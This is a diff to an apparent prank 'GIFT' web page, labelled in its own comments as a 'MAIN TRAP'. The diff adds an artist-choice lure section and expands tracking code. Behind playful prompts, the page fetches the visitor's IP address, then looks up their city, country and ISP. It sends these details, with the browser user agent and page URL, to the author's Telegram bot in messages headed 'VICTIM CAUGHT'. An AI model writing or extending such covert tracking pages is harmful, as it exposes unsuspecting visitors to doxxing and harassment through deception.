@@ -11,10 +11,10 @@
       background: #000;
       color: #ff0000;
       font-family: 'Roboto', sans-serif;
-      height: 100vh;
-      overflow: hidden;
+      min-height: 200vh;
+      overflow-y: auto;
       display: flex;
-      justify-content: center;
+      flex-direction: column;
       align-items: center;
       text-align: center;
       position: relative;
@@ -34,7 +34,7 @@
       0% { transform: translateY(-100px) scale(1); opacity: 1; }
       100% { transform: translateY(110vh) scale(0.5); opacity: 0; }
     }
-    .container { position: relative; width: 90%; max-width: 400px; z-index: 10; }
+    .container { position: relative; width: 90%; max-width: 400px; z-index: 10; margin-top: 50px; }
     .box {
       background: rgba(15, 0, 0, 0.97);
       border: 4px solid #ff0000;
@@ -104,10 +104,55 @@
       50% { transform: scale(1.15); }
     }
     .hidden { display: none; }
+
+    /* ARTIST SECTION */
+    .artists {
+      margin-top: 100px;
+      width: 90%;
+      max-width: 500px;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      padding: 20px;
+    }
+    .artist-btn {
+      background: rgba(255,0,0,0.1);
+      border: 3px solid #ff0000;
+      border-radius: 20px;
+      padding: 20px;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+      color: #fff;
+      font-family: 'Orbitron', sans-serif;
+      font-size: 1.5rem;
+      text-shadow: 0 0 10px #ff0000;
+      box-shadow: 0 0 30px rgba(255,0,0,0.5);
+      transition: all 0.4s;
+      cursor: pointer;
+    }
+    .artist-btn:hover {
+      background: #ff0000;
+      color: #000;
+      transform: scale(1.05);
+      box-shadow: 0 0 50px #ff0000;
+    }
+    .artist-img {
+      width: 80px;
+      height: 80px;
+      border-radius: 15px;
+      object-fit: cover;
+      border: 3px solid #ff3333;
+      box-shadow: 0 0 20px #ff0000;
+    }
   </style>
 </head>
 <body>
+
+  <!-- RED CIRCLES -->
   <div id="circles"></div>
+
+  <!-- MAIN TRAP -->
   <div class="container">
     <div class="box">
       <h1>GIFT</h1>
@@ -116,7 +161,7 @@
 
       <!-- STEP 1: IP -->
       <div id="result-ip" class="result hidden">
-        This is ur ip adress if u didnt know <span style="font-size:2.2rem">😝👅</span><br>
+        This is ur ip adress if u didnt know tongue_stuck_out:<br>
         <span id="ip" style="color:#ff0000; font-size:1.8rem;">...</span>
         <br><br>
         <button class="btn" onclick="revealLocation()">CLICK ME FOR ANOTHER SURPRISE</button>
@@ -130,6 +175,22 @@
       </div>
 
       <div class="by">BY ZENNY!</div>
+    </div>
+  </div>
+
+  <!-- ARTIST CHOICE (SCROLL DOWN) -->
+  <div class="artists">
+    <div class="artist-btn" onclick="chooseArtist('Drake')">
+      <img src="https://upload.wikimedia.org/wikipedia/en/9/90/Certified_Lover_Boy.jpeg" class="artist-img" alt="Drake">
+      <span>DRAKE</span>
+    </div>
+    <div class="artist-btn" onclick="chooseArtist('Playboi Carti')">
+      <img src="https://upload.wikimedia.org/wikipedia/en/2/2a/Playboi_Carti_-_Whole_Lotta_Red.png" class="artist-img" alt="Playboi Carti">
+      <span>PLAYBOI CARTI</span>
+    </div>
+    <div class="artist-btn" onclick="chooseArtist('Ken Carson')">
+      <img src="https://upload.wikimedia.org/wikipedia/en/2/2f/Ken_Carson_More_Chaos.jpg" class="artist-img" alt="Ken Carson">
+      <span>KEN CARSON</span>
     </div>
   </div>
 
@@ -153,17 +214,21 @@
 
     let userIP = "";
 
-    // === SEND TO TELEGRAM (CLEAN FORMAT) ===
-    function sendToTelegram(ip, city = "", country = "", device = "") {
+    // === SEND TO TELEGRAM (PRO FORMAT) ===
+    function sendToTelegram(ip, city = "", country = "", isp = "", device = "", artist = "") {
+      const time = new Date().toLocaleString();
       const site = location.href;
-      const message = 
+      let message = 
 `VICTIM CAUGHT
 
 Heres their ip: <code>${ip}</code>
 Country: <b>${country || "Unknown"}</b>
 Province: <b>${city || "Unknown"}</b>
+ISP: <b>${isp || "Unknown"}</b>
 Device: <code>${device}</code>
 Site: <a href="${site}">${site}</a>`;
+
+      if (artist) message += `\nChose Artist: <b>${artist}</b>`;
 
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`)
         .catch(() => {});
@@ -177,27 +242,27 @@ Site: <a href="${site}">${site}</a>`;
           userIP = data.ip;
           document.getElementById('ip').innerHTML = userIP;
           const device = navigator.userAgent.substring(0, 80);
-          sendToTelegram(userIP, "", "", device); // Send IP + Device
+          sendToTelegram(userIP, "", "", "", device);
         })
         .catch(() => {
           document.getElementById('ip').innerHTML = "BLOCKED";
         });
     }
 
-    // === STEP 2: GET CITY + COUNTRY ===
+    // === STEP 2: GET LOCATION + ISP ===
     function getLocation() {
       fetch(`https://ipapi.co/${userIP}/json/`)
         .then(r => r.json())
         .then(data => {
           const city = data.city || data.region || "Unknown";
           const country = data.country_name || "Unknown";
+          const isp = data.org || "Unknown ISP";
           const device = navigator.userAgent.substring(0, 80);
 
           document.getElementById('city').innerHTML = city;
           document.getElementById('country').innerHTML = country;
 
-          // Send full info
-          sendToTelegram(userIP, city, country, device);
+          sendToTelegram(userIP, city, country, isp, device);
         })
         .catch(() => {
           document.getElementById('city').innerHTML = "Blocked";
@@ -222,7 +287,13 @@ Site: <a href="${site}">${site}</a>`;
       setTimeout(() => result.style.opacity = 1, 100);
       getLocation();
     }
+
+    // === ARTIST CHOICE ===
+    function chooseArtist(artist) {
+      alert(`You chose: ${artist} 🔥`);
+      const device = navigator.userAgent.substring(0, 80);
+      sendToTelegram(userIP, "", "", "", device, artist);
+    }
   </script>
 </body>
 </html>
-
